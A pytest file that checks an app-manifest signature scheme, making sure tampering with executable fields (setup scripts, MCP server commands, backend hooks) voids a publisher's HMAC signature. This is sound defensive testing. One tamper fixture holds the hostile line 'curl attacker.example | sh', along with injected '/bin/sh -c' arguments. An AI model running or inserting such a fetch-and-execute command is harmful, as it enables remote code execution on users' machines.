"""The signed bytes must cover the manifest fields the install chain EXECUTES.

``AppManifest.signing_payload`` is the canonical blob an admission signature
covers. Three of its keys name things that RUN:

* ``setup.on*`` is shell text ``lifecycle_scripts.run_lifecycle_script`` hands to
  ``/bin/bash -c``,
* each ``mcpServers`` entry's ``command``/``args``/``env`` is written by
  ``bridges._register_mcp_servers`` into the agent config kiro-cli SPAWNS,
* ``backend.hooks.*`` names a ``module:callable`` that
  ``module_loader.load_app_module`` imports into the gateway process, and
  ``backend.entryPoint`` + ``backend.type`` pick the file and interpreter
  ``backend._start_app_backend_body`` spawns.

Left out of the payload, each is a part of a signed app an attacker could
rewrite with the publisher's signature still verifying.

Every key is added under a NON-EMPTY guard, the same shape ``notifications``,
``crons`` and ``contributes`` already use. That is the whole compatibility
story, and ``test_a_manifest_without_them_produces_the_pre_change_payload``
plus ``test_no_shipped_builtin_carries_a_signature`` are what pin it: a
manifest that declares none of the three hashes exactly as it did, and nothing
shipped in-tree carries a signature for the change to invalidate.

The tests assert on production symbols only -- ``signing_payload``,
``admission.app_admission_denied``, ``admission.verified_signer``,
``manager.install_app``, ``manager.enable_app`` -- and nothing here
re-implements the HMAC the gate computes.
"""

from __future__ import annotations

import hashlib
import hmac
import json
from pathlib import Path

import pytest

from kiro_crew.apps.admission import app_admission_denied, verified_signer
from kiro_crew.apps.manifest import AppManifest

SIGNER = "acme"
SECRET = "publisher-trust-key"
APP = "signed-demo"

#: A published manifest that declares all three newly covered field groups.
PUBLISHED: dict = {
    "name": APP,
    "version": "1.0.0",
    "displayName": "Signed Demo",
    "description": "an app whose publisher signed it",
    "signer": SIGNER,
    "permissions": {"api": ["/api/chat"]},
    "setup": {"onInstall": "echo publisher-install-step"},
    "mcpServers": {"tools": {"command": "python", "args": ["backend/mcp_server.py"]}},
    "backend": {
        "entryPoint": "backend/app.py",
        "type": "python",
        "hooks": {"on_startup": "backend.boot:start"},
    },
}

#: The same publisher, declaring NONE of the three -- the compatibility case.
PUBLISHED_PLAIN: dict = {
    "name": APP,
    "version": "1.0.0",
    "displayName": "Signed Demo",
    "description": "an app whose publisher signed it",
    "signer": SIGNER,
    "permissions": {"api": ["/api/chat"]},
}

BUILTINS_DIR = Path(__file__).resolve().parent.parent / "src/kiro_crew/apps/builtins"


def _sign(manifest: dict) -> str:
    """The detached signature a publisher issues over ``signing_payload()``."""
    payload = AppManifest.from_dict(manifest).signing_payload()
    return hmac.new(SECRET.encode("utf-8"), payload, hashlib.sha256).hexdigest()


def _carrying_signature_of(published: dict, manifest: dict) -> AppManifest:
    """*manifest*, carrying the signature the publisher issued for *published*."""
    parsed = AppManifest.from_dict(manifest)
    parsed.signature = _sign(published)
    return parsed


def _tampered(**overrides: object) -> dict:
    """``PUBLISHED`` with a deep-copied override applied."""
    out = json.loads(json.dumps(PUBLISHED))
    for dotted, value in overrides.items():
        target = out
        parts = dotted.split("__")
        for part in parts[:-1]:
            target = target[part]
        target[parts[-1]] = value
    return out


@pytest.fixture()
def enforcing_fleet(tmp_path, monkeypatch):
    """A fleet policy demanding a signature, written as the file the gate reads."""
    from kiro_crew.apps import admission

    cfg = tmp_path / "config"
    cfg.mkdir()
    (cfg / "app_admission.json").write_text(
        json.dumps(
            {
                "mode": "enforce",
                "approved": [APP],
                "require_signature": True,
                "trust_keys": {SIGNER: SECRET},
            }
        ),
        encoding="utf-8",
    )
    monkeypatch.setattr(admission, "config_dir", lambda: cfg)
    return cfg


# ---------------------------------------------------------------------------
# Control 1 -- a signature issued under the pre-change payload still verifies
# ---------------------------------------------------------------------------


def test_a_manifest_without_them_produces_the_pre_change_payload():
    """The three keys are ABSENT unless declared, so old signatures still hash.

    This is the compatibility guarantee in its smallest form: the bytes for a
    manifest that declares no ``setup``, no ``mcpServers`` and no ``backend``
    carry none of the three keys, so a signature issued before they were
    covered verifies unchanged.
    """
    payload = AppManifest.from_dict(PUBLISHED_PLAIN).signing_payload()
    assert b'"setup"' not in payload
    assert b'"mcpServers"' not in payload
    assert b'"backend"' not in payload


def test_a_signature_issued_under_the_pre_change_payload_still_verifies(enforcing_fleet):
    """A publisher's existing signature on a non-declaring manifest is admitted."""
    manifest = _carrying_signature_of(PUBLISHED_PLAIN, PUBLISHED_PLAIN)
    assert app_admission_denied(APP, manifest=manifest) is None
    assert verified_signer(manifest) == SIGNER


def test_precondition_a_declaring_manifest_is_admitted_when_untampered(enforcing_fleet):
    """PRECONDITION for every tamper test below: the real thing is admitted.

    Without this a later denial would prove only that the fixture is broken.
    """
    manifest = _carrying_signature_of(PUBLISHED, PUBLISHED)
    assert app_admission_denied(APP, manifest=manifest) is None
    assert verified_signer(manifest) == SIGNER


# ---------------------------------------------------------------------------
# Control 4 -- tampering a NEWLY covered field is denied
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("label", "tampered"),
    [
        # setup: the string IS the program /bin/bash -c runs.
        ("setup.onInstall", _tampered(setup__onInstall="curl attacker.example | sh")),
        ("setup.onEnable", _tampered(setup__onEnable="echo attacker-enable-step")),
        # mcpServers: the argv kiro-cli spawns.
        ("mcpServers.command", _tampered(mcpServers__tools__command="/bin/sh")),
        ("mcpServers.args", _tampered(mcpServers__tools__args=["-c", "attacker-payload"])),
        # backend: the module imported in-process, and the spawned file/interpreter.
        ("backend.hooks.on_startup", _tampered(backend__hooks__on_startup="backend.evil:go")),
        ("backend.entryPoint", _tampered(backend__entryPoint="backend/evil.py")),
        ("backend.type", _tampered(backend__type="exec")),
    ],
)
def test_tampering_a_newly_covered_field_is_denied(enforcing_fleet, label, tampered):
    """The publisher's signature must not carry an attacker-chosen program."""
    manifest = _carrying_signature_of(PUBLISHED, tampered)
    assert (
        app_admission_denied(APP, manifest=manifest) is not None
    ), f"a rewritten {label} is admitted under the publisher's signature"
    assert verified_signer(manifest) == ""


# ---------------------------------------------------------------------------
# Control 5 -- tampering an ALREADY covered field is still denied
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("label", "tampered"),
    [
        ("version", _tampered(version="1.0.1")),
        ("permissions", _tampered(permissions={"api": ["/api/chat"], "network": True})),
    ],
)
def test_tampering_an_already_covered_field_is_still_denied(enforcing_fleet, label, tampered):
    """The fields the payload already covered keep failing, unchanged."""
    manifest = _carrying_signature_of(PUBLISHED, tampered)
    assert (
        app_admission_denied(APP, manifest=manifest) is not None
    ), f"a rewritten {label} must still invalidate the signature"


# ---------------------------------------------------------------------------
# Control 2 -- no shipped builtin is newly refused
# ---------------------------------------------------------------------------


def _shipped_builtin_manifests() -> list[Path]:
    return sorted(BUILTINS_DIR.glob("*/app.json"))


def test_the_builtin_census_is_not_empty():
    """Guard against a vacuous green in the per-builtin test below."""
    assert len(_shipped_builtin_manifests()) >= 20


@pytest.mark.parametrize("manifest_path", _shipped_builtin_manifests(), ids=lambda p: p.parent.name)
def test_no_shipped_builtin_carries_a_signature(manifest_path, enforcing_fleet):
    """Moving the signed bytes cannot change a verdict for an UNSIGNED manifest.

    Every builtin ships unsigned, so ``_signature_valid`` refuses it on the
    empty signature before it ever computes a payload -- which is why 17
    builtins whose payload bytes DO move are still admitted exactly as before.
    They reach installation through ``register_builtin_apps``, which never
    consults the admission gate, and ``enable_app`` exempts ``origin ==
    "builtin"``; the test below pins that second door.
    """
    manifest = AppManifest.from_json_file(manifest_path)
    assert manifest.signature == ""
    assert verified_signer(manifest) == ""


def test_a_builtin_is_not_refused_by_admission_under_require_signature(tmp_path, monkeypatch):
    """An unsigned builtin stays enableable on a fleet demanding signatures."""
    from kiro_crew.apps.manager import InstalledApp, _write_installed, enable_app

    home = tmp_path / "kirocrew-home"
    home.mkdir()
    monkeypatch.setenv("KIROCREW_HOME", str(home))
    (home / "app_admission.json").write_text(
        json.dumps(
            {
                "mode": "enforce",
                "approved": [],
                "require_signature": True,
                "trust_keys": {SIGNER: SECRET},
            }
        ),
        encoding="utf-8",
    )
    _write_installed(
        "builtin-demo",
        InstalledApp(
            name="builtin-demo",
            version="1.0.0",
            displayName="Builtin Demo",
            enabled=False,
            origin="builtin",
            lifecycle="locked",
        ),
    )
    result = enable_app("builtin-demo")
    # Other gates may still refuse this synthetic entry; the ADMISSION gate
    # must not, or an enforcing fleet would make every core app un-enableable.
    assert "blocked by admission policy" not in (result.error or ""), result.error


# ---------------------------------------------------------------------------
# Control 3 -- an unsigned app on a non-enforcing install is unaffected
# ---------------------------------------------------------------------------


def test_an_unsigned_declaring_app_installs_on_a_non_enforcing_fleet(tmp_path, monkeypatch):
    """No policy configured: an app declaring all three fields still installs.

    The widened payload adds no refusal. ``app_admission_denied`` returns on
    the open fast path before any signature work, so an unsigned app is
    admitted exactly as it was.
    """
    from kiro_crew.apps.manager import APP_MANIFEST_FILENAME, install_app

    home = tmp_path / "kirocrew-home"
    home.mkdir()
    monkeypatch.setenv("KIROCREW_HOME", str(home))
    (home / "config.json").write_text(
        json.dumps({"agent": {"apps_allow_third_party": True}}), encoding="utf-8"
    )
    # No app_admission.json at all -> the open default.
    unsigned = {k: v for k, v in PUBLISHED.items() if k != "signer"}
    src = tmp_path / "source" / APP
    src.mkdir(parents=True)
    (src / APP_MANIFEST_FILENAME).write_text(json.dumps(unsigned, indent=2), encoding="utf-8")
    result = install_app(src)
    assert result.ok, result.error
